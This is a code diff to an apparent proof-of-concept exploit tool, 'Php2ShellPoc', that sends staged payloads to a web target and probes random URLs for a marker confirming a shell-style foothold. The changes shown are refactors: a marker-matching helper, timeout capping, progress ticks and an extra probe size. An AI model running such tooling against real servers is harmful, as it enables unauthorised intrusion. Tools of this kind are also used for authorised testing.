@@ -8,6 +8,7 @@ use Php2ShellTui\Http\Client;
 use Php2ShellTui\ScanCancelled;
 use Php2ShellTui\ScanRestart;
 use Php2ShellTui\Target;
+use Psr\Http\Message\ResponseInterface;
 
 final class Php2ShellPoc
 {
@@ -73,7 +74,7 @@ final class Php2ShellPoc
         }
 
         $origin = self::origin($scheme, $host, $port);
-        $proof = $this->chooseProofPath($target, $origin, $path);
+        $proof = $this->chooseProofPath($target, $origin, $path, $onTick);
 
         if (is_string($proof)) {
             return new PocResult(false, $proof);
@@ -248,7 +249,7 @@ final class Php2ShellPoc
                     $carrier = $profile->stage3Carrier() ? $payload['carrier'] : null;
                     $builder->stage3B($b, $payload['ht'], $ref, $carrier);
                     $this->tick($onTick);
-                    $raw->sendBody($path, $b, self::STAGE_TYPE, 65536, 30.0);
+                    $raw->sendBody($path, $b, self::STAGE_TYPE, 65536, min(30.0, $this->remaining($deadline)));
                 } catch (ScanCancelled|ScanRestart $e) {
                     throw $e;
                 } catch (\Throwable) {
@@ -262,11 +263,7 @@ final class Php2ShellPoc
                     $proofUrl = $origin . $candidate . '?p2s=' . bin2hex(random_bytes(4));
                     $response = $this->client->get($proofUrl, $target->requestHeaders());
 
-                    if ($response === null || $response->getStatusCode() !== 200) {
-                        continue;
-                    }
-
-                    if (trim((string) $response->getBody()) !== $marker) {
+                    if ($response === null || !self::proofMatches($response, $marker)) {
                         continue;
                     }
 
@@ -313,7 +310,7 @@ final class Php2ShellPoc
         $raw = new RawHttp($scheme, $host, $port, $requestTimeout, $target->requestHeaders());
 
         try {
-            foreach ([16, 64, 256] as $mb) {
+            foreach ([16, 64, 128, 256] as $mb) {
                 $file = tempnam(sys_get_temp_dir(), 'p2s-probe-');
                 if ($file === false) {
                     continue;
@@ -353,11 +350,16 @@ final class Php2ShellPoc
         return null;
     }
 
+    public static function proofMatches(ResponseInterface $response, string $marker): bool
+    {
+        return $response->getStatusCode() === 200
+            && trim((string) $response->getBody()) === $marker;
+    }
+
     /**
-     * @param list<string> $temporary
      * @return array{string, list<string>}|string
      */
-    private function chooseProofPath(Target $target, string $origin, string $path): array|string
+    private function chooseProofPath(Target $target, string $origin, string $path, ?\Closure $onTick): array|string
     {
         for ($attempt = 0; $attempt < 5; $attempt++) {
             $file = ProofPath::randomFile();
@@ -365,6 +367,7 @@ final class Php2ShellPoc
             $free = true;
 
             foreach ($candidates as $candidate) {
+                $this->tick($onTick);
                 $url = $origin . $candidate . '?p2s=' . bin2hex(random_bytes(4));
                 $response = $this->client?->get($url, $target->requestHeaders());
 
